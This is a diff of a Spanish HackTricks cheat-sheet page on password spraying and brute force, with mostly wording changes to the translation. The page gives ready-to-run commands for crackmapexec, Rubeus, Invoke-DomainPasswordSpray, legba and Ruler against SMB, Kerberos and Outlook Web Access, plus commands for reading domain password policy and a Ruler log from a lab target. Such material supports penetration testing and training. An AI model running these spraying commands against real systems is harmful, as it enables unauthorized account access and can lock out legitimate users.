@@ -1,31 +1,31 @@
-# Ataque de Fuerza Bruta / Password Spraying
+# Password Spraying / Fuerza Bruta
 
 <details>
 
-<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Experto en Red Team de AWS de HackTricks)</strong></a><strong>!</strong></summary>
 
 Otras formas de apoyar a HackTricks:
 
-* Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
-* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
-* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
-* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
-* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
+* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
+* Obtén el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
+* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
+* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
 
 ## **Password Spraying**
 
-Una vez que hayas encontrado varios **nombres de usuario válidos**, puedes probar las **contraseñas más comunes** (teniendo en cuenta la política de contraseñas del entorno) con cada uno de los usuarios descubiertos.\
-Por **defecto**, la **longitud mínima** de la **contraseña** es de **7**.
+Una vez que hayas encontrado varios **nombres de usuario válidos**, puedes probar con las contraseñas más **comunes** (ten en cuenta la política de contraseñas del entorno) con cada uno de los usuarios descubiertos.\
+Por **defecto**, la **longitud mínima de la contraseña** es **7**.
 
-Las listas de nombres de usuario comunes también pueden ser útiles: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)
+Las listas de nombres de usuario comunes también podrían ser útiles: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)
 
-Ten en cuenta que **podrías bloquear algunas cuentas si intentas varias contraseñas incorrectas** (por defecto más de 10).
+Ten en cuenta que **podrías bloquear algunas cuentas si pruebas varias contraseñas incorrectas** (por defecto, más de 10).
 
 ### Obtener la política de contraseñas
 
-Si tienes credenciales de algún usuario o una shell como usuario de dominio, puedes **obtener la política de contraseñas con**:
+Si tienes algunas credenciales de usuario o una shell como usuario de dominio, puedes **obtener la política de contraseñas con**:
 ```bash
 # From Linux
 crackmapexec <IP> -u 'user' -p 'password' --pass-pol
@@ -42,9 +42,9 @@ net accounts
 
 (Get-DomainPolicy)."SystemAccess" #From powerview
 ```
-### Explotación desde Linux (o todos)
+### Explotación desde Linux (o cualquier sistema)
 
-* Usando **crackmapexec:**
+* Utilizando **crackmapexec:**
 ```bash
 crackmapexec smb <IP> -u users.txt -p passwords.txt
 # Local Auth Spray (once you found some local admin pass or hash)
@@ -80,7 +80,7 @@ done
 ```
 #### Desde Windows
 
-* Con la versión de [Rubeus](https://github.com/Zer1t0/Rubeus) con módulo de fuerza bruta:
+* Con [Rubeus](https://github.com/Zer1t0/Rubeus) versión con módulo de fuerza bruta:
 ```bash
 # with a list of users
 .\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>
@@ -88,7 +88,7 @@ done
 # check passwords for all users in current domain
 .\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
 ```
-* Con [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) (Puede generar usuarios del dominio por defecto y obtendrá la política de contraseñas del dominio y limitará los intentos de acuerdo con ella):
+* Con [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) (Puede generar usuarios del dominio de forma predeterminada y obtendrá la política de contraseñas del dominio para limitar los intentos según esta):
 ```powershell
 Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
 ```
@@ -96,23 +96,25 @@ Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
 ```
 Invoke-SprayEmptyPassword
 ```
-## Fuerza Bruta
+## Fuerza bruta
 
 {% code overflow="wrap" %}
 ```bash
 legba kerberos --target 127.0.0.1 --username admin --password wordlists/passwords.txt --kerberos-realm example.org
 ```
-## Outlook Web Access
+{% endcode %}
 
-Existen múltiples herramientas para **password spraying en Outlook**.
+## Acceso web de Outlook
+
+Existen múltiples herramientas para realizar **ataques de rociado de contraseñas en Outlook**.
 
 * Con [MSF Owa\_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa\_login/)
-* Con [MSF Owa\_ews\_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa\_ews\_login/)
+* con [MSF Owa\_ews\_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa\_ews\_login/)
 * Con [Ruler](https://github.com/sensepost/ruler) (¡confiable!)
 * Con [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) (Powershell)
 * Con [MailSniper](https://github.com/dafthack/MailSniper) (Powershell)
 
-Para utilizar cualquiera de estas herramientas, necesitas una lista de usuarios y una contraseña / una pequeña lista de contraseñas para realizar el spray.
+Para utilizar cualquiera de estas herramientas, necesitas una lista de usuarios y una contraseña / una pequeña lista de contraseñas para rociar.
 ```bash
 ./ruler-linux64 --domain reel2.htb -k brute --users users.txt --passwords passwords.txt --delay 0 --verbose
 [x] Failed: larsson:Summer2020
@@ -133,10 +135,10 @@ Para utilizar cualquiera de estas herramientas, necesitas una lista de usuarios 
 
 ## Referencias
 
-* [https://ired.team/experimentos-de-seguridad-ofensiva/active-directory-kerberos-abuse/active-directory-password-spraying](https://ired.team/experimentos-de-seguridad-ofensiva/active-directory-kerberos-abuse/active-directory-password-spraying)
-* [https://www.ired.team/seguridad-ofensiva/acceso-inicial/password-spraying-outlook-web-access-remote-shell](https://www.ired.team/seguridad-ofensiva/acceso-inicial/password-spraying-outlook-web-access-remote-shell)
-* www.blackhillsinfosec.com/?p=5296
-* [https://hunter2.gitbook.io/darthsidious/acceso-inicial/password-spraying](https://hunter2.gitbook.io/darthsidious/acceso-inicial/password-spraying)
+* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying)
+* [https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell](https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell)
+* [www.blackhillsinfosec.com/?p=5296](www.blackhillsinfosec.com/?p=5296)
+* [https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying](https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying)
 
 <details>
 
@@ -144,10 +146,10 @@ Para utilizar cualquiera de estas herramientas, necesitas una lista de usuarios 
 
 Otras formas de apoyar a HackTricks:
 
-* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** revisa los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
-* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
-* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
-* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
-* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
+* Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
+* Obtén la [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
+* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
+* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
